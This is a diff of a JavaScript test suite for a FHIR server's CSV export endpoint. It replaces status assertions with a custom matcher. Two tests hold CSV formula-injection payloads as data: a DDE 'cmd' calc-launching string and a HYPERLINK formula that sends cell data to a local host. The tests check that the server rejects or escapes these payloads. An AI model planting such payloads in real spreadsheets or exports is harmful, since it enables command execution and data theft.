@@ -57,7 +57,7 @@ describe('CSV Export', () => {
           },
         ],
       });
-    expect(res1.status).toBe(201);
+    expect(res1).toHaveStatus(201);
 
     // Also create an empty patient to make sure we handle missing values
     const res2 = await request(app)
@@ -67,12 +67,12 @@ describe('CSV Export', () => {
       .send({
         resourceType: 'Patient',
       });
-    expect(res2.status).toBe(201);
+    expect(res2).toHaveStatus(201);
 
     const res3 = await request(app)
       .get(`/fhir/R4/Patient/$csv?_fields=id,name,address,email,phone`)
       .set('Authorization', 'Bearer ' + accessToken);
-    expect(res3.status).toBe(200);
+    expect(res3).toHaveStatus(200);
     expect(res3.text).toContain(res1.body.id);
     expect(res3.text).toContain(res2.body.id);
     expect(res3.text).toContain('123 Main St');
@@ -111,12 +111,12 @@ describe('CSV Export', () => {
       .set('Authorization', 'Bearer ' + accessToken)
       .set('Content-Type', ContentType.FHIR_JSON)
       .send(serviceRequest);
-    expect(res1.status).toBe(201);
+    expect(res1).toHaveStatus(201);
 
     const res3 = await request(app)
       .get(`/fhir/R4/ServiceRequest/$csv?_fields=id,subject,code,orderDetail`)
       .set('Authorization', 'Bearer ' + accessToken);
-    expect(res3.status).toBe(200);
+    expect(res3).toHaveStatus(200);
     expect(res3.text).toContain(res1.body.id);
     expect(res3.text).toContain('Alice Smith');
     expect(res3.text).toContain('test1');
@@ -153,14 +153,14 @@ describe('CSV Export', () => {
       .set('Authorization', 'Bearer ' + accessToken)
       .set('Content-Type', ContentType.FHIR_JSON)
       .send(serviceRequest);
-    expect(res1.status).toBe(201);
+    expect(res1).toHaveStatus(201);
 
     const res3 = await request(app)
       .get(
         `/fhir/R4/ServiceRequest/$csv?_fields=id,subject,code,orderDetail&subject=${serviceRequest.subject?.reference}`
       )
       .set('Authorization', 'Bearer ' + accessToken);
-    expect(res3.status).toBe(200);
+    expect(res3).toHaveStatus(200);
     expect(res3.text).toContain(res1.body.id);
     expect(res3.text).toContain('Alice Smith');
     expect(res3.text).toContain('Shipped');
@@ -171,14 +171,14 @@ describe('CSV Export', () => {
     const res = await request(app)
       .get(`/fhir/R4/Patientx/$csv`)
       .set('Authorization', 'Bearer ' + accessToken);
-    expect(res.status).toBe(400);
+    expect(res).toHaveStatus(400);
   });
 
   test('Invalid query string param', async () => {
     const res = await request(app)
       .get(`/fhir/R4/Patient/$csv?_count=20&_fields=id,_lastUpdated,=cmd|'/C%20calc'!A0&_offset=0&_sort=-_lastUpdated`)
       .set('Authorization', 'Bearer ' + accessToken);
-    expect(res.status).toBe(400);
+    expect(res).toHaveStatus(400);
     expect(res.body.issue[0].details.text).toStrictEqual('Invalid FHIRPath expression');
   });
 
@@ -192,12 +192,12 @@ describe('CSV Export', () => {
         resourceType: 'Patient',
         gender: '=HYPERLINK("http://localhost:8181/?data="&F3,"Click Me")',
       });
-    expect(res1.status).toBe(201);
+    expect(res1).toHaveStatus(201);
 
     const res3 = await request(app)
       .get(`/fhir/R4/Patient/$csv?_fields=id,gender`)
       .set('Authorization', 'Bearer ' + accessToken);
-    expect(res3.status).toBe(200);
+    expect(res3).toHaveStatus(200);
     expect(res3.text).toContain(res1.body.id);
 
     // Note the escaped quotes and single quote prefix
